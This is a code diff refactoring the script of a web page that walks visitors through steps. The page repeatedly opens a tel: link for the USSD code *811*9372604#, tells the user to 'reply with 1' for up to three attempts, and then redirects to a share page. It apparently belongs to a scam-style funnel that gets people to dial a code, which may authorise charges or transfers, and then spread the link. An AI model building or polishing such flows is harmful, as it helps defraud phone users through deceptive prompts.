@@ -54,62 +54,46 @@
 </div>
 
 <script>
-localStorage.setItem("dialCompleted","true");
 
-alert(localStorage.getItem("dialCompleted"));
-
-window.location.href="share.html"; 
+// If Step 1 is already complete, go straight to Step 2
+if (localStorage.getItem("dialCompleted") === "true") {
+    window.location.href = "share.html";
 }
+
+// Restore click count if user comes back from the dialer
 let dialClicks = Number(localStorage.getItem("dialClicks")) || 0;
 
+function dialNow() {
 
-function dialNow(){
-
-    if(dialClicks < 3){
-
-       dialClicks++;
-
-localStorage.setItem("dialClicks", dialClicks);
-
-        document.getElementById("dialStatus").innerHTML =
-        "Complete the USSD process and reply with 1. Attempt " + dialClicks + " of 3.";
-
-        window.location.href="tel:*811*9372604%23";
-
-    } else {
-
-        document.getElementById("dialBtn").disabled = true;
-
-        document.getElementById("dialBtn").innerHTML =
-        "✅ Dial Completed";
-
-        alert("You have completed the Dial Code step.");
-
-    }
-
-}
-
-
-function completeDial(){
-
-    if(dialClicks === 0){
-
-        alert("Please tap Dial Code Now first.");
-
+    if (dialClicks >= 3) {
+        alert("You have already completed this step.");
         return;
-
     }
 
-    localStorage.setItem("dialCompleted","true");
+    dialClicks++;
+    localStorage.setItem("dialClicks", dialClicks);
 
-// Reset dial clicks for the next application
-localStorage.removeItem("dialClicks");
+    document.getElementById("dialStatus").innerHTML =
+    "Complete the USSD process and reply with 1. Attempt " + dialClicks + " of 3.";
 
-window.location.href="share.html";
-
+    window.location.href = "tel:*811*9372604%23";
 }
 
-</script> 
+function completeDial() {
+
+    // Check that Dial Now was tapped at least once
+    if (Number(localStorage.getItem("dialClicks")) === 0) {
+        alert("Please tap Dial Code Now first.");
+        return;
+    }
+
+    localStorage.setItem("dialCompleted", "true");
+    localStorage.removeItem("dialClicks");
+
+    window.location.href = "share.html";
+}
+
+</script>
 
 </body>
 </html>
